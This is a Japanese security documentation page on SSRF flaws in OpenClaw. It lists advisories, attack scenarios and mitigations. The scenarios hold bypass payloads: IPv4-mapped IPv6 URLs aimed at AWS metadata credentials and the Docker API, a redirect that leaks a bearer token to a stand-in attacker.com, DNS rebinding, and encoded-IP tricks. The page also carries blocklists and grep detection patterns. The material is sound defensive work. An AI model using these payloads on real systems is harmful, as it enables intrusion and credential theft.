# Server-Side Request Forgery (SSRF)

## 概要

Server-Side Request Forgery（SSRF）脆弱性により、攻撃者はサーバーに意図しないHTTPリクエストを内部または外部リソースに対して実行させることができます。OpenClawでは、fetch-guardバイパス、DNSピンニング喪失、リダイレクト処理、URL検証の弱点でSSRF脆弱性が発見されています。

**影響**: 内部サービスへのアクセス（AWSメタデータ、データベース）、認証情報の窃取、ラテラルムーブメント、情報漏洩。

## 脆弱性リスト

### High（高）

| アドバイザリ | CVE | 概要 | 修正バージョン |
|----------|-----|---------|----------|
| [GHSA-jrvc-8ff5-2f9f](https://github.com/openclaw/openclaw/security/advisories/GHSA-jrvc-8ff5-2f9f) | — | IPv4マップIPv6経由のSSRFガードバイパス | v2026.2.14 |
| [GHSA-6mgf-v5j7-45cr](https://github.com/openclaw/openclaw/security/advisories/GHSA-6mgf-v5j7-45cr) | — | fetch-guardがクロスオリジンリダイレクトでカスタムAuthorizationヘッダーを転送 | v2026.3.7 |
| [GHSA-8mvx-p2r9-r375](https://github.com/openclaw/openclaw/security/advisories/GHSA-8mvx-p2r9-r375) | — | 環境プロキシ設定時にWebツールの厳格なURLガードがDNSピンニングを失う | v2026.3.2 |
| [GHSA-2858-xg23-26fp](https://github.com/openclaw/openclaw/security/advisories/GHSA-2858-xg23-26fp) | — | NodeカメラURLペイロードホストバインディングバイパスによりゲートウェイフェッチピボットが可能 | v2026.3.2 |

### Medium（中）

| アドバイザリ | CVE | 概要 | 修正バージョン |
|----------|-----|---------|----------|
| [GHSA-g99v-8hwm-g76g](https://github.com/openclaw/openclaw/security/advisories/GHSA-g99v-8hwm-g76g) | — | プライベートネットワーク許可ポリシーによるweb_search引用リダイレクトSSRF | v2026.3.1 |

**合計**: 5件のアドバイザリ（高4件、中1件）

## 攻撃シナリオ

### 1. IPv4マップIPv6バイパス (GHSA-jrvc-8ff5-2f9f)

**攻撃ベクター**: IPv4アドレスをIPv6 IPv4マップアドレス（例: `::ffff:127.0.0.1`）としてエンコードしてSSRF保護をバイパス。

**例**:
```
通常のリクエスト（ブロックされる）:
http://127.0.0.1/admin

IPv4マップIPv6（ガードをバイパス）:
http://[::ffff:127.0.0.1]/admin
http://[::ffff:169.254.169.254]/latest/meta-data/
```

**ターゲットリソース**:
- AWS EC2メタデータ: `http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/`
- 内部サービス: `http://[::ffff:127.0.0.1]:8080/admin`
- Docker API: `http://[::ffff:172.17.0.1]:2375/containers/json`

**影響**:
- AWS認証情報の窃取
- 内部API アクセス
- コンテナ列挙

### 2. リダイレクト経由のAuthorizationヘッダーリーク (GHSA-6mgf-v5j7-45cr)

**攻撃ベクター**: fetch-guardのクロスオリジンリダイレクト処理を悪用して、カスタムAuthorizationヘッダーを攻撃者制御のサーバーに漏洩。

**例**:
```
1. 攻撃者がevil.comでリダイレクトをホスト:
   HTTP/1.1 302 Found
   Location: https://attacker.com/steal

2. OpenClawが認証情報付きリクエストを実行:
   GET https://evil.com/api
   Authorization: Bearer secret_token

3. fetch-guardがリダイレクトに従い、ヘッダーをリーク:
   GET https://attacker.com/steal
   Authorization: Bearer secret_token  # ← 漏洩！
```

**影響**:
- APIキーの窃取
- OAuthトークンの漏洩
- Gateway認証情報の露出

### 3. プロキシ経由のDNSピンニング喪失 (GHSA-8mvx-p2r9-r375)

**攻撃ベクター**: 環境変数（`HTTP_PROXY`、`HTTPS_PROXY`）経由でHTTPプロキシが設定されている場合、DNSピンニング保護がバイパスされ、TOCTOU攻撃が可能。

**例**:
```
# プロキシ付き環境
export HTTP_PROXY=http://proxy.example.com:8080

# OpenClawがURLを検証
1. DNS解決: example.com → 93.184.216.34（パブリックIP）✓
2. 検証が通過

# DNSリバインディング攻撃
3. 攻撃者がDNSを変更: example.com → 127.0.0.1
4. リクエストがプロキシ経由、DNSが再解決される
5. プロキシが http://127.0.0.1/ をフェッチ（内部リソース）
```

**影響**:
- 内部ネットワークアクセス
- localhostサービスの悪用
- IPホワイトリストのバイパス

### 4. NodeカメラURLホストバインディングバイパス (GHSA-2858-xg23-26fp)

**攻撃ベクター**: カメラURLホストバインディング検証を悪用してゲートウェイフェッチピボットを実行。

**例**:
```javascript
// 寛容なバインディングのカメラURL
{
  "cameraUrl": "http://0.0.0.0:8080/stream"
}

// ゲートウェイフェッチが内部サービスにピボット
// 攻撃者は同じホスト上の任意のサービスにアクセス可能
```

**影響**:
- 内部サービスの列挙
- ゲートウェイフェッチの悪用
- 認証情報の収集

### 5. web_search引用リダイレクトSSRF (GHSA-g99v-8hwm-g76g)

**攻撃ベクター**: プライベートネットワーク許可ポリシーでweb_search引用リダイレクト処理を悪用して内部リソースにアクセス。

**例**:
```
1. 攻撃者が悪意のあるweb_search引用を作成:
   {
     "url": "https://evil.com/redirect",
     "title": "正当な記事"
   }

2. evil.comが内部リソースへのリダイレクトを返す:
   HTTP/1.1 302 Found
   Location: http://192.168.1.100/admin

3. web_searchがリダイレクトに従う（プライベートネットワーク許可）
4. 内部リソースのコンテンツがフェッチされ露出
```

**影響**:
- 内部ドキュメントの漏洩
- HTTP API経由のデータベースアクセス
- クラウドメタデータの露出

## 一般的なSSRFバイパス技術

### URLエンコーディングと難読化

```
# 10進数IPエンコーディング
http://2130706433/  (127.0.0.1を10進数で)

# 16進数IPエンコーディング
http://0x7f000001/  (127.0.0.1を16進数で)

# 8進数IPエンコーディング
http://0177.0.0.1/  (127.0.0.1を8進数で)

# 混合エンコーディング
http://127.0.0.1.nip.io/  (DNSワイルドカードサービス)

# URL短縮サービス
http://bit.ly/internal-redirect
```

### DNSリバインディング

```
1. 初回リクエスト: evil.com → パブリックIP（検証通過）
2. TTL期限切れ
3. 2回目のリクエスト: evil.com → 127.0.0.1（SSRF達成）
```

### HTTPリダイレクトチェーン

```
https://legitimate.com/
  → https://attacker.com/
    → http://169.254.169.254/latest/meta-data/
```

## 緩和策

### 1. 厳格なURL検証

**多層検証の実装**:
```javascript
function validateURL(url) {
  const parsed = new URL(url);

  // 1. プロトコルホワイトリスト
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Invalid protocol');
  }

  // 2. ホスト名ブロックリスト
  const blockedHosts = [
    'localhost',
    '127.0.0.1',
    '0.0.0.0',
    '169.254.169.254', // AWSメタデータ
    '::1',
    '::ffff:127.0.0.1'
  ];

  if (blockedHosts.includes(parsed.hostname)) {
    throw new Error('Blocked hostname');
  }

  // 3. プライベートIP範囲チェック
  if (isPrivateIP(parsed.hostname)) {
    throw new Error('Private IP not allowed');
  }

  return parsed;
}

function isPrivateIP(hostname) {
  // IPv4プライベート範囲をチェック
  const ipv4Regex = /^(\d{1,3}\.){3}\d{1,3}$/;
  if (ipv4Regex.test(hostname)) {
    const parts = hostname.split('.').map(Number);
    // 10.0.0.0/8
    if (parts[0] === 10) return true;
    // 172.16.0.0/12
    if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
    // 192.168.0.0/16
    if (parts[0] === 192 && parts[1] === 168) return true;
  }

  // IPv6プライベート範囲とIPv4マップアドレスをチェック
  if (hostname.includes(':')) {
    // 簡略化のため全IPv6を拒否（またはRFC4193の完全チェックを実装）
    return true;
  }

  return false;
}
```

### 2. DNSピンニング

**DNS解決のロック**:
```javascript
const dns = require('dns').promises;

async function fetchWithDNSPinning(url) {
  const parsed = new URL(url);

  // 1. ホスト名を解決
  const addresses = await dns.resolve4(parsed.hostname);
  const ip = addresses[0];

  // 2. 解決されたIPを検証
  if (isPrivateIP(ip)) {
    throw new Error('Resolved to private IP');
  }

  // 3. 解決されたIPを使用してリクエスト
  const pinnedURL = url.replace(parsed.hostname, ip);

  return fetch(pinnedURL, {
    headers: {
      'Host': parsed.hostname // 元のHostヘッダーを保持
    }
  });
}
```

### 3. リダイレクトを無効化またはリダイレクト先を検証

**オプション1: リダイレクトを無効化**:
```javascript
fetch(url, {
  redirect: 'manual' // リダイレクトに従わない
});
```

**オプション2: 各リダイレクトを検証**:
```javascript
async function fetchWithRedirectValidation(url, maxRedirects = 3) {
  let currentURL = url;
  let redirectCount = 0;

  while (redirectCount < maxRedirects) {
    validateURL(currentURL); // チェーン内の全URLを検証

    const response = await fetch(currentURL, { redirect: 'manual' });

    if (response.status >= 300 && response.status < 400) {
      currentURL = response.headers.get('Location');
      redirectCount++;
    } else {
      return response;
    }
  }

  throw new Error('Too many redirects');
}
```

### 4. クロスオリジンリクエストで機密ヘッダーを削除

```javascript
function sanitizeHeaders(headers, targetOrigin, originalOrigin) {
  if (targetOrigin !== originalOrigin) {
    // クロスオリジンリクエストで機密ヘッダーを削除
    delete headers['Authorization'];
    delete headers['Cookie'];
    delete headers['X-API-Key'];
  }
  return headers;
}
```

### 5. ネットワークレベルの制限

**ファイアウォールルール**（iptablesの例）:
```bash
# AWSメタデータへのアクセスをブロック
iptables -A OUTPUT -d 169.254.169.254 -j DROP

# プライベートIP範囲をブロック
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
```

**ネットワークセグメンテーション**:
- OpenClawを隔離されたネットワークセグメントで実行
- クラウドサービスにVPCエンドポイントを使用（メタデータアクセスなし）
- エグレスフィルタリングの実装

### 6. プロキシ設定のハードニング

**内部リクエストでプロキシを無効化**:
```javascript
const { HttpProxyAgent } = require('http-proxy-agent');

function getAgent(url) {
  const parsed = new URL(url);

  // 内部IPにはプロキシを使用しない
  if (isPrivateIP(parsed.hostname)) {
    return undefined; // プロキシなし
  }

  return new HttpProxyAgent(process.env.HTTP_PROXY);
}

fetch(url, { agent: getAgent(url) });
```

### 7. OpenClawランタイムチェック

SSRF保護ランタイムチェックを有効化:

```bash
# fetch-guard厳格モードを有効化
openclaw --runtime-check ssrf-guard-strict

# DNSピンニングを有効化
openclaw --runtime-check dns-pinning

# プライベートネットワークアクセスを無効化
openclaw --runtime-check block-private-networks
```

包括的なSSRF保護設定は [ハードニングガイド](../best-practices/hardening-guide.md) を参照してください。

## 検出

### リクエスト監視

```bash
# 内部IPアクセス試行を監視
grep -E '(127\.0\.0\.1|169\.254\.|192\.168\.|10\.)' /var/log/openclaw/fetch.log

# IPv6エンコードIPを監視
grep -E '\[::ffff:' /var/log/openclaw/fetch.log

# リダイレクトチェーンをチェック
grep "redirect" /var/log/openclaw/fetch.log | wc -l
```

### 異常検出

- 内部IPへの予期しないアウトバウンド接続
- 大量のHTTPリダイレクト
- クラウドメタデータエンドポイントへのリクエスト
- ログ内のAuthorizationヘッダーリーク

## 関連リソース

- **脆弱性ドキュメント**:
  - [RCE脆弱性](./rce.md) - SSRFはしばしばRCEにつながる
  - [コマンドインジェクション](./command-injection.md) - 関連する攻撃ベクター
- **テスト**: `tests/agent-hijack/`ディレクトリにテストケースがあります（テスト9）
- **ベストプラクティス**:
  - [ハードニングガイド - ネットワークセキュリティ](../best-practices/hardening-guide.md)
- **テストガイド**: [エージェントハイジャックテストガイド](../test-cases/agent-hijack-guide.md)

## 参考資料

- **CWE-918**: Server-Side Request Forgery (SSRF)
- **CWE-441**: Unintended Proxy or Intermediary ('Confused Deputy')
- **OWASP**: [Server-Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- **PortSwigger**: [SSRF Attacks](https://portswigger.net/web-security/ssrf)
- **AWS**: [IMDSv2 - Protecting Against SSRF](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
